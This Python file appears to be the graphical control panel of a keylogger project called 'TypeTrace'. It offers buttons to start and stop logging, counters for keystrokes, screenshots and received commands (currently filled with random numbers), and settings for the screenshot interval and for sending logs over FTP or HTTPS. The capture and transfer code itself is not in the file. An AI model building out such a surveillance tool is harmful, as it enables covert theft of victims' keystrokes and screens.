
import ttkbootstrap as ttk
from ttkbootstrap.constants import *
from tkinter import StringVar, messagebox
import logging
from core.system_info import SystemInfo
import random  # Simulating stats for now

class KeyloggerDashboard:
    def __init__(self, root, config, controllers):
        self.root = root
        self.config = config
        self.controllers = controllers
        self.system_info = SystemInfo()

        # Theme control
        self.theme_state = "darkly"  # Start with dark theme
        self.style = ttk.Style(theme=self.theme_state)

        self._setup_ui()
        self._start_periodic_updates()

    def _setup_ui(self):
        self.root.title("Management Console")
        self.root.geometry("1200x800")
        self.root.configure(bg="#2c3e50")

        # Top Heading Frame with Theme Toggle
        heading_frame = ttk.Frame(self.root)
        heading_frame.pack(pady=(20, 10), fill='x')

        heading_label = ttk.Label(
            heading_frame,
            text="TypeTrace",
            font=("Segoe UI", 36, "bold"),
            bootstyle="primary"
        )
        heading_label.pack(side='left', padx=20)

        # Toggle Theme Button
        self.toggle_btn = ttk.Button(
            heading_frame,
            text="\U0001F319 Toggle Theme",
            bootstyle="secondary-outline",
            command=self.toggle_theme
        )
        self.toggle_btn.pack(side='right', padx=20)

        # Underline
        underline = ttk.Separator(self.root, orient='horizontal', bootstyle="primary")
        underline.pack(fill='x', padx=20, pady=(5, 15))

        # Notebook Tabs
        self.notebook = ttk.Notebook(self.root, bootstyle="primary")
        self.dashboard_frame = ttk.Frame(self.notebook, padding=15)
        self.config_frame = ttk.Frame(self.notebook, padding=15)

        self._create_dashboard()
        self._create_config_editor()

        self.notebook.add(self.dashboard_frame, text='\U0001F4CA Dashboard')
        self.notebook.add(self.config_frame, text='\u2699 Configuration')
        self.notebook.pack(expand=True, fill='both', padx=10, pady=10)

        # Status Bar
        self.status_bar = ttk.Label(
            self.root,
            text="Welcome to the Keylogger Management Console",
            relief="sunken",
            anchor="w",
            bootstyle="secondary"
        )
        self.status_bar.pack(side="bottom", fill="x")

    def toggle_theme(self):
        # Toggle between darkly and flatly themes
        if self.theme_state == "darkly":
            self.theme_state = "flatly"
        else:
            self.theme_state = "darkly"

        self.style.theme_use(self.theme_state)
        self.status_bar.config(text=f"Theme changed to {self.theme_state.capitalize()}.")

    def _create_dashboard(self):
        sys_info_frame = ttk.LabelFrame(self.dashboard_frame, text="\U0001F5A5 System Information", bootstyle="info", padding=15)
        self.sys_info_labels = {
            'cpu': ttk.Label(sys_info_frame, text="CPU Usage: -", font=("Segoe UI", 12)),
            'memory': ttk.Label(sys_info_frame, text="Memory Usage: -", font=("Segoe UI", 12)),
            'disk': ttk.Label(sys_info_frame, text="Disk Usage: -", font=("Segoe UI", 12))
        }
        for label in self.sys_info_labels.values():
            label.pack(anchor='w', padx=10, pady=3)

        self.cpu_progress = ttk.Progressbar(sys_info_frame, value=0, maximum=100, bootstyle="success", length=500)
        self.memory_progress = ttk.Progressbar(sys_info_frame, value=0, maximum=100, bootstyle="info", length=500)
        self.disk_progress = ttk.Progressbar(sys_info_frame, value=0, maximum=100, bootstyle="danger", length=500)

        self.cpu_progress.pack(fill='x', padx=10, pady=3)
        self.memory_progress.pack(fill='x', padx=10, pady=3)
        self.disk_progress.pack(fill='x', padx=10, pady=3)

        sys_info_frame.pack(fill='x', padx=10, pady=15)

        control_frame = ttk.LabelFrame(self.dashboard_frame, text="\U0001F6E0 Logging Controls", bootstyle="secondary", padding=15)
        self.start_btn = ttk.Button(control_frame, text="\u25B6 Start Logging", bootstyle="success-outline", command=self.start_logging)
        self.stop_btn = ttk.Button(control_frame, text="\u23F9 Stop Logging", bootstyle="danger-outline", command=self.stop_logging)
        self.start_btn.pack(side='left', padx=15, pady=10)
        self.stop_btn.pack(side='left', padx=15, pady=10)
        control_frame.pack(fill='x', padx=10, pady=15)

        stats_frame = ttk.LabelFrame(self.dashboard_frame, text="\U0001F4C8 Logging Stats", bootstyle="info", padding=15)
        self.keystroke_label = ttk.Label(stats_frame, text="Keystrokes Logged: 0", font=("Segoe UI", 12))
        self.screenshot_label = ttk.Label(stats_frame, text="Screenshots Taken: 0", font=("Segoe UI", 12))
        self.commands_label = ttk.Label(stats_frame, text="Commands Received: 0", font=("Segoe UI", 12))

        self.keystroke_label.pack(anchor='w', padx=10, pady=5)
        self.screenshot_label.pack(anchor='w', padx=10, pady=5)
        self.commands_label.pack(anchor='w', padx=10, pady=5)

        stats_frame.pack(fill='x', padx=10, pady=15)

    def _create_config_editor(self):
        config_editor = ttk.LabelFrame(self.config_frame, text="\U0001F6E0 Configuration Settings", bootstyle="info", padding=15)
        config_editor.columnconfigure(1, weight=1)

        ttk.Label(config_editor, text="Screenshot Interval (seconds):").grid(row=0, column=0, padx=10, pady=10, sticky='w')
        self.screenshot_interval = StringVar(value=str(self.config['general']['screenshot_interval']))
        ttk.Entry(config_editor, textvariable=self.screenshot_interval).grid(row=0, column=1, padx=10, pady=10, sticky='ew')

        ttk.Label(config_editor, text="Log Transfer Method:").grid(row=1, column=0, padx=10, pady=10, sticky='w')
        self.transfer_method = StringVar(value=self.config['transfer']['method'])
        ttk.Combobox(config_editor, textvariable=self.transfer_method, values=['ftp', 'https'], bootstyle="primary").grid(row=1, column=1, padx=10, pady=10, sticky='ew')

        ttk.Button(config_editor, text="\U0001F4BE Save Configuration", bootstyle="primary", command=self.save_config).grid(
            row=2, column=1, padx=10, pady=20, sticky='e')

        config_editor.pack(fill='both', expand=True, padx=10, pady=10)

    def _start_periodic_updates(self):
        self._update_system_info()
        self.root.after(2000, self._start_periodic_updates)

    def _update_system_info(self):
        cpu = self.system_info.get_cpu_usage()
        memory = self.system_info.get_memory_usage()
        disk = self.system_info.get_disk_usage()

        self.sys_info_labels['cpu'].config(text=f"CPU Usage: {cpu}%")
        self.sys_info_labels['memory'].config(text=f"Memory Usage: {memory}%")
        self.sys_info_labels['disk'].config(text=f"Disk Usage: {disk}%")

        self.cpu_progress['value'] = cpu
        self.memory_progress['value'] = memory
        self.disk_progress['value'] = disk

        self.keystroke_label.config(text=f"Keystrokes Logged: {random.randint(100, 2000)}")
        self.screenshot_label.config(text=f"Screenshots Taken: {random.randint(10, 200)}")
        self.commands_label.config(text=f"Commands Received: {random.randint(0, 50)}")

    def start_logging(self):
        try:
            for controller in self.controllers.values():
                controller.start()
            self.status_bar.config(text="Logging started successfully.")
            messagebox.showinfo("Info", "Logging started successfully")
        except Exception as e:
            logging.error(f"Failed to start logging: {e}")
            self.status_bar.config(text=f"Error: {str(e)}")
            messagebox.showerror("Error", f"Failed to start logging: {str(e)}")

    def stop_logging(self):
        try:
            for controller in self.controllers.values():
                controller.stop()
            self.status_bar.config(text="Logging stopped successfully.")
            messagebox.showinfo("Info", "Logging stopped successfully")
        except Exception as e:
            logging.error(f"Failed to stop logging: {e}")
            self.status_bar.config(text=f"Error: {str(e)}")
            messagebox.showerror("Error", f"Failed to stop logging: {str(e)}")

    def save_config(self):
        try:
            self.config['general']['screenshot_interval'] = int(self.screenshot_interval.get())
            self.config['transfer']['method'] = self.transfer_method.get()
            self.status_bar.config(text="Configuration saved successfully.")
            messagebox.showinfo("Info", "Configuration saved successfully")
        except ValueError:
            self.status_bar.config(text="Error: Invalid input values.")
            messagebox.showerror("Error", "Invalid input values")
        except Exception as e:
            logging.error(f"Configuration save failed: {e}")
            self.status_bar.config(text=f"Error: {str(e)}")
            messagebox.showerror("Error", f"Configuration save failed: {str(e)}")